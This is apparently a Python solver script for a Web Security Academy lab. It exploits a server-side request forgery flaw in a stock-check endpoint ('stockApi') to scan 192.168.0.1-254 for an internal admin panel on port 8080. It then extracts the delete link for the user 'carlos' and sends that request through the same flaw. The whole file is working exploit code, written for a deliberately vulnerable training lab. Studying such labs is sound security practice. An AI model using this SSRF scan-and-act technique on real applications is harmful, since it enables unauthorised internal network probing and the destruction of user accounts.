from web_security_academy.core.logger import logger, NoNewline
from bs4 import BeautifulSoup


def solve_lab(session):
    path = "/product/stock"
    data = "{'stockApi': 'http://192.168.0.\033[1;93m?\033[00m:8080/admin'}"

    logger.info(
        f'Scanning the internal network by sending POST requests to "{path}" with the following data:'
    )
    logger.info(f"{data}")

    with NoNewline():
        for i in range(1, 255):
            internal_url = f"http://192.168.0.{i}:8080/admin"
            data = {"stockApi": internal_url}
            resp = session.post_path(path, data=data)

            if resp.status_code != 200:
                logger.info(f"{i} => {resp.status_code}")
            else:
                logger.success(f"{i} => 200")
                break
        else:
            logger.failure("Unable to find an admin interface on port 8080.")
            return

    logger.info("Using latest response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        logger.failure("Unable to find URL.")
        return
    else:
        ssrf = tag.get("href")[1:]
        logger.success(f"Found URL: {ssrf}")

    data = {"stockApi": ssrf}
    logger.info(
        f'Deleting the user carlos by sending a POST request to "{path}" with the following data:'
    )
    logger.info(f"{data}")

    resp = session.post_path(path, data=data, allow_redirects=False)
    logger.success("POST request sent successfully.")
